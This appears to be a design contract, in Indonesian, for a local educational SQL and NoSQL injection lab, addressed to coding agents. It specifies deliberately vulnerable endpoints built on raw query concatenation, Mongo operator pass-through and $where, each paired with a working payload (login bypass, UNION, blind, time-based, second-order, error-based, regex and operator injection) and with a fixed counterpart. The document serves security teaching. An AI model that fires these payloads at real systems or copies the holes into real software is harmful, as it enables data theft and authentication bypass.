# CONTRACT.md — Vulnerability Lab (lab-injection)

Single source of truth untuk API, schema DB, dan konvensi. Baca SEBELUM menulis kode.
Semua agent (backend SQL, backend NoSQL, frontend) WAJIB mengikuti dokumen ini.

---

## 1. Arsitektur

- Backend: **Node.js 25 + Express 4** — file `server/index.js` (entry), port **8100**
- SQLite: modul built-in **`node:sqlite`** (`DatabaseSync`) — TANPA dependency native
- MongoDB: **`mongodb`** driver resmi v6, koneksi `mongodb://127.0.0.1:27017/lab_injection` (via docker-compose atau `docker run`)
- Frontend: **Vite + React 18 + Tailwind CSS v4** (`@tailwindcss/vite` plugin, CSS-first, tanpa tailwind.config) — dev port **8101** (proxy `/api` → 8100); production: `client/dist` di-serve oleh Express di `:8100`
- Semua response JSON. **Format sukses:** `{ ok: true, data: ... }` — **Format error:** `{ ok: false, error: "pesan" }`

## 2. Struktur Folder

```
lab-injection/
├── docker-compose.yml          # mongo:7 bound 127.0.0.1:27017 (dokumentasi; pakai docker run jika compose plugin absen)
├── jalankan.sh                 # skrip setup env + start
├── package.json                # root: scripts (server, client, dev, mongo)
├── CONTRACT.md                 # <== dokumen ini
├── server/
│   ├── package.json
│   ├── index.js                # express app: mount routes + serve client/dist
│   ├── db/
│   │   ├── sqlite.js           # init node:sqlite + seed (tabel users/products/pelanggan/pesanan)
│   │   └── mongo.js            # init mongodb driver + seed (users/products)
│   └── routes/
│       ├── sqli.vulnerable.js  # 6 endpoint VULNERABLE
│       ├── sqli.fixed.js       # 6 endpoint FIXED (path sama, prefix /fixed)
│       ├── nosql.vulnerable.js # 4 endpoint VULNERABLE
│       ├── nosql.fixed.js      # 4 endpoint FIXED
│       └── meta.js             # daftar challenge + SECRETS map + /api/meta/verify
└── client/
    ├── package.json, vite.config.js, index.html
    └── src/ (main.jsx, App.jsx, index.css, data/challenges.js,
        lib/progress.js, lib/api.js, components/, pages/)
```

## 3. Konvensi Route

- Setiap file route mengekspor factory: `module.exports = function (app, ctx) { ... }`
  dengan `ctx = { sqlite, mongo }` (`sqlite` = instance `DatabaseSync`, `mongo` = handle db Mongo `lab_injection`).
- Endpoint vulnerable PASTI diawali komentar `// VULNERABLE: raw query concatenation` (atau versi yang sesuai) tepat di atas query yang rentan.
- Endpoint fixed PASTI parameterized (prepared statement / sanitasi operator) + komentar `// FIXED: parameterized query`.
- Path fixed = path vulnerable + prefix `/fixed`. Contoh: `POST /api/sqli/ch1/login` (vuln) vs `POST /api/sqli/fixed/ch1/login` (fixed).

## 4. Schema SQLite (`server/db/sqlite.js`, file: `server/data/lab.db`)

```sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY,
  username TEXT UNIQUE NOT NULL,
  password TEXT NOT NULL,          -- plaintext (kelemahan nyata yang diajarkan di lab)
  hash TEXT,                       -- digest bcrypt admin (target sqli-2 via UNION)
  nama TEXT NOT NULL,
  role TEXT NOT NULL DEFAULT 'user',
  email TEXT DEFAULT '',
  telepon TEXT DEFAULT '',
  secret TEXT                      -- api key; hanya admin & budi punya
);
-- admin: username='admin', password='admin123', hash='$2b$10$N9qo8u...lhWy',
--        email='admin@vulnlab.test', telepon='0812-3344-5566',
--        secret='sk_admin_9f3Kq2mZvX7c'
-- budi:  password='budi123', email='budi@vulnlab.test', telepon='0813-1122-3344',
--        secret='sk_budi_5h2Kq9mZt4wY'
-- citra: password='citra123', email='citra@vulnlab.test', telepon='0815-6677-8899'
-- dian:  password='dian123',  email='dian@vulnlab.test', telepon='0817-9900-1122'

CREATE TABLE products (
  id INTEGER PRIMARY KEY,
  nama TEXT NOT NULL,
  kategori TEXT NOT NULL,
  harga INTEGER NOT NULL,
  stok INTEGER NOT NULL,
  deskripsi TEXT DEFAULT ''
);
-- 12 produk realistis Indonesia: Elektronik (e.g. "Smart TV 43\"", harga 3500000),
-- Fashion ("Kemeja Flanel", 189000), Makanan ("Kopi Arabika Gayo 250g", 85000),
-- dll. Variasi kategori: 'Elektronik','Fashion','Makanan','Perabot','Kesehatan'.

CREATE TABLE pelanggan (
  id INTEGER PRIMARY KEY,
  username TEXT NOT NULL,
  nama TEXT NOT NULL,
  alamat TEXT DEFAULT ''
);

CREATE TABLE pesanan (
  id INTEGER PRIMARY KEY,
  kode TEXT NOT NULL,          -- e.g. 'INV-2026-0001'
  pelanggan TEXT NOT NULL,     -- menyimpan USERNAME (string) — inti second-order
  produk TEXT NOT NULL,
  total INTEGER NOT NULL
);
-- 6 pesanan, pelanggan berisi username valid ('budi','citra','dian').
-- citra punya INV-2026-0002 dan INV-2026-0005 (target sqli-5 = INV-2026-0002).
```

Catatan: TIDAK ada tabel `flags` — setiap challenge membocorkan **data alami aplikasi**
(api key, digest bcrypt, email, telepon, kode pesanan orang lain, recovery code,
token sesi, kode batch produk tersembunyi). Lihat §7 untuk pemetaan lengkap.

## 5. Schema MongoDB (db `lab_injection`)

```js
db.users: [
  { username:'admin', password:'admin123', role:'admin', nama:'Administrator Utama',
    email:'admin@vulnlab.test',
    secret:'sk_admin_7Kq9mZ2pXv5nB4',       // api key (nosql-1)
    recovery:'REC-4F9K-8Q2M-7X3B',          // recovery code (nosql-2)
    token:'ses_8f3Kq9mZ2pXv5nB7c4wL6dR' },  // token sesi (nosql-4)
  { username:'budi',  password:'budi123',  role:'user', nama:'Budi Santoso', email:'budi@vulnlab.test' },
  { username:'citra', password:'citra123', role:'user', nama:'Citra Dewi',  email:'citra@vulnlab.test' },
  { username:'dian',  password:'dian123',  role:'user', nama:'Dian Permata', email:'dian@vulnlab.test' }
]
db.products: [
  ... 12 produk realistis (visible:true) ...
  { name:'Produk Rahasia VVIP', kategori:'Eksklusif', harga:50000000, stok:2, visible:false,
    deskripsi:'Batch eksklusif: BATCH-VVIP-2026-9X4K' }   // kode batch (nosql-3), tersembunyi sampai di-bypass
]
```
Catatan T3 (operator pollution): endpoint search default mengembalikan produk `visible:true` saja.
Payload `{"visible":{"$ne":true}}` melewatkan filter → produk VVIP (sekalian kode batch di `deskripsi`) bocor.

## 6. Endpoint API

### 6.1 Meta
| Method | Path | Deskripsi |
|---|---|---|
| GET | `/api/meta/challenges` | Daftar 10 challenge `{ id, modul, level, judul, kategori }` |
| POST | `/api/meta/verify` | Body `{ challenge_id, secret }` → cek terhadap SECRETS map → `{ ok, solved }` |

### 6.2 SQLi — Vulnerable (prefix `/api/sqli`)
| # | Path | Nama | Teknik | Target (data yang bocor) |
|---|---|---|---|---|
| 1 | `POST /api/sqli/ch1/login` | Login Bypass | `' OR '1'='1'-- -` | users.secret admin (`sk_admin_9f3Kq2mZvX7c`) |
| 2 | `GET /api/sqli/ch2/search?q=` | UNION-Based | `x' UNION SELECT 1,hash,1,1 FROM users...` | users.hash admin (digest bcrypt) |
| 3 | `GET /api/sqli/ch3/profile?id=` | Blind Boolean | `AND (SELECT substr(email,1,1)...)` oracle true/false | users.email admin |
| 4 | `GET /api/sqli/ch4/filter?kategori=` | Time-Based | CASE WHEN + heavy subquery (randomblob) | users.telepon admin |
| 5 | `POST /api/sqli/ch5/register` + `GET /api/sqli/ch5/report?pelanggan_id=` | Second-Order | payload di username, tereksekusi saat report | pesanan.kode milik citra (`INV-2026-0002`) |
| 6 | `GET /api/sqli/ch6/item?id=` | Error-Based | `json_extract()` meng-echo nilai pada pesan error | users.secret budi (`sk_budi_5h2Kq9mZt4wY`) |

Detail tiap endpoint:
1. **ch1 login** — `SELECT * FROM users WHERE username='${u}' AND password='${p}'`.
   Sukses → `{ ok:true, data:{ id, username, nama, role, secret } }` (secret admin ikut ke response — itu desainnya).
2. **ch2 search** — `SELECT id, nama, harga, deskripsi FROM products WHERE nama LIKE '%${q}%'` (4 kolom).
   → `{ ok:true, data:{ hasil:[{id,nama,harga,deskripsi}] } }`. UNION: `x' UNION SELECT 1,hash,1,1 FROM users WHERE username='admin'-- ` → kolom `hash` tampil sebagai `nama`.
3. **ch3 profile** — `SELECT id, nama, role FROM users WHERE id = ${id}`. Ada → `{ ok:true, data:{ ditemukan:true, ... } }`; tidak ada → `{ ok:true, data:{ ditemukan:false } }` (TIDAK boleh error/500 untuk memudahkan oracle). Oracle: `1 AND (SELECT substr(email,1,1) FROM users WHERE username='admin')='a'` → true.
4. **ch4 filter** — `SELECT id, nama, harga FROM products WHERE kategori = '${kategori}'` TAPI response TIDAK menampilkan data hasil (hanya `{ ok:true, data:{ jumlah: N } }`). Oracle waktu: `x' OR (SELECT CASE WHEN (SELECT substr(telepon,1,1) FROM users WHERE username='admin')='0' THEN randomblob(50000000) ELSE 1 END) AND '1'='1` (delay ≥ 400ms saat TRUE, tanpa delay saat FALSE).
5. **ch5** — register: `INSERT INTO pelanggan (username,nama,alamat) VALUES ('${username}','${nama}','${alamat}')` → `{ ok:true, data:{ pelanggan_id } }`.
   report: `SELECT kode, produk, total FROM pesanan WHERE pelanggan = '${username_yang_tersimpan}'` (username diambil dari tabel pelanggan by id) → `{ ok:true, data:{ laporan:[...] } }`.
   Attack: register username `x' UNION SELECT kode,produk,total FROM pesanan WHERE pelanggan='citra'-- -` lalu generate report → kode `INV-2026-0002` bocor.
6. **ch6 item** — `SELECT id, nama, harga, stok FROM products WHERE id = ${id}`. Error handler: `res.status(500).json({ ok:false, error: 'Query error: ' + err.message.slice(0,80) + ' [truncated]' })`.
   Attack: `1 AND json_extract('{}', (SELECT secret FROM users WHERE username='budi'))` → `bad JSON path: 'sk_budi_5h2Kq9mZt4wY'` muncul di dalam 80 char pertama.

### 6.3 SQLi — Fixed (prefix `/api/sqli/fixed`)
Endpoint sama, prepared statement (`db.prepare(...).all(param)`). T1 login juga gunakan prepared statement (dan jangan return kolom `secret` di fixed version — return hanya `{id,username,nama,role}`).
T5 register tetap simpan username TANPA validasi tambahan (hanya escape otomatis lewat prepared statement); report pakai prepared statement.

### 6.4 NoSQLi — Vulnerable (prefix `/api/nosql`)
| # | Path | Nama | Teknik | Target (data yang bocor) |
|---|---|---|---|---|
| 1 | `POST /api/nosql/ch1/login` | Auth Bypass | `{"username":{"$ne":null},"password":{"$ne":null}}` | users.secret admin (`sk_admin_7Kq9mZ2pXv5nB4`) |
| 2 | `GET /api/nosql/ch2/check?username=&prefix=` | Blind Regex | oracle `$regex:'^'+prefix` | users.recovery admin (`REC-4F9K-8Q2M-7X3B`) |
| 3 | `GET /api/nosql/ch3/search?filter=` | Operator Pollution | `JSON.parse(filter)` → `find()` langsung | products.deskripsi VVIP (`BATCH-VVIP-2026-9X4K`) |
| 4 | `GET /api/nosql/ch4/debug?where=` | $where JS Injection | `find({ $where: where })` oracle count | users.token admin (`ses_8f3Kq9mZ2pXv5nB7c4wL6dR`) |

Detail:
1. **ch1 login** — `await db.users.findOne({ username: body.username, password: body.password })` (body JSON mentah tanpa sanitasi). Sukses → `{ ok:true, data:{ id, username, nama, role, secret } }`.
2. **ch2 check** — `await db.users.findOne({ username: username, recovery: { $regex: '^' + prefix } })` → match: `{ ok:true, data:{ cocok:true } }` else `{ cocok:false }`. Attacker ekstrak `recovery` char-by-char (`^R`, `^RE`, ...).
3. **ch3 search** — `const filter = JSON.parse(req.query.filter || '{}'); const hasil = await db.products.find({ ...default, ...filter }).toArray()` dengan `default = { visible: true }`. VULNERABLE karena spread `filter` (buatan user) bisa menimpa `visible` dan menyuntik operator. → `{ ok:true, data:{ hasil:[{name,kategori,harga,deskripsi,visible}] } }`. Jika `JSON.parse` gagal → `{ ok:false, error:"filter tidak valid" }`.
4. **ch4 debug** — `const where = String(req.query.where || ''); const hasil = await db.users.find({ $where: where }).toArray()` → `{ ok:true, data:{ jumlah: hasil.length, user:[{username,role}] } }` (TANPA secret/recovery/token di output). Oracle boolean: `this.username=='admin' && this.token.startsWith('s')` → jumlah 1 vs 0.

### 6.5 NoSQLi — Fixed (prefix `/api/nosql/fixed`)
- ch1: jangan dukung nested operator — cek `typeof body.username !== 'string' || typeof body.password !== 'string'` → 400, bandingkan pakai `$eq` eksplisit, jangan return `secret`.
- ch2: `new RegExp('^' + prefix.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))` (escape regex) — tetap jaga agar tidak membocorkan data via regex meta-character.
- ch3: tolak kunci yang diawali `$`: `Object.keys(filter).some(k => k.startsWith('$'))` → 400; whitelist bidang `{ name, kategori }` untuk pencarian.
- ch4: HAPUS dukungan `$where` — tolak `where` yang bukan string sederhana; response sama.

## 7. Secret verification (`/api/meta/verify`)

Server mengecek input secret terhadap **nilai nyata di dalam DB** (bukan kolom flags):
- sqli-1: `SELECT secret FROM users WHERE username='admin'` → `sk_admin_9f3Kq2mZvX7c`
- sqli-2: `SELECT hash FROM users WHERE username='admin'` → `$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy`
- sqli-3: `SELECT email FROM users WHERE username='admin'` → `admin@vulnlab.test`
- sqli-4: `SELECT telepon FROM users WHERE username='admin'` → `0812-3344-5566`
- sqli-5: `SELECT kode FROM pesanan WHERE pelanggan='citra' ORDER BY id LIMIT 1` → `INV-2026-0002`
- sqli-6: `SELECT secret FROM users WHERE username='budi'` → `sk_budi_5h2Kq9mZt4wY`
- nosql-1: `db.users.findOne({username:'admin'}).secret` → `sk_admin_7Kq9mZ2pXv5nB4`
- nosql-2: `.recovery` → `REC-4F9K-8Q2M-7X3B`
- nosql-3: `db.products.findOne({visible:false}).deskripsi` → `Batch eksklusif: BATCH-VVIP-2026-9X4K`
- nosql-4: `.token` → `ses_8f3Kq9mZ2pXv5nB7c4wL6dR`

Response `{ ok:true, solved: true|false }`. Implementasi: SECRETS map di `routes/meta.js`
(fungsi per challenge yang query DB saat request — selalu sinkron dengan seed terbaru).

## 8. Frontend (React + Tailwind v4)

- Framework: Vite 6 + React 18, `@tailwindcss/vite` plugin, CSS-first (`@import "tailwindcss";` di `index.css`), tanpa `tailwind.config`.
- Routing: `react-router-dom` (v6.30+). Halaman:
  1. `/` Landing — hero + banner edukasi + kartu modul (SQLi 6 / NoSQLi 4) + tombol ke dashboard.
  2. `/dashboard` — grid kartu 10 challenge, status selesai/belum (dari localStorage), filter modul.
  3. `/challenge/:id` — halaman challenge: deskripsi ala HTB/PortSwigger, badge modul+level+target, accordion "Lihat Hint" (collapse), tab "Kode Rentan" (snippet source vulnerable), form "Verifikasi Hasil" (submit secret bocor), status "Selesai" + penjelasan akar masalah (root cause).
- Progress: `lib/progress.js` — localStorage key `lab-injection-progress`, simpan map `{ [challenge_id]: true }`; fungsi `isSolved(id)`, `countSolved()`.
- Verifikasi: `lib/api.js` → `verifySecret(challenge_id, secret)` POST ke `/api/meta/verify`. Komponen `components/SecretForm.jsx` (bukan FlagForm).
- Data challenge statis: `data/challenges.js` — 10 objek `{ id, kategori, judul, level, target, deskripsi, hint, payload, rootCause, kodeRentan, kodeAman, url, endpoint }`. Kode snippet ditulis manual string template (bukan fetch server). Sync dengan §6.
- Desain: dark modern (ops-console: bg `#07080a`, aksen `#55b3ff`), typography jelas, responsif. Banner di landing: **"FOR LOCAL/EDUCATIONAL USE ONLY — do not expose to public internet"**.

## 9. Keamanan & Etika (jangan dilanggar)

- TIDAK ada payload destruktif (tidak ada `DROP TABLE`, `db.dropDatabase()`, dsb) di hint atau kode.
- Target selalu data natural aplikasi (api key, hash, email, telepon, kode pesanan, recovery, token, batch) — TIDAK ada format `FLAG{...}`.
- Parse body pakai `express.json()`.
- Tambahkan middleware sederhana untuk header `X-Lab-Mode: vulnerable` (sinyal bahwa ini lab lokal) pada semua route `/api/sqli/*` dan `/api/nosql/*`.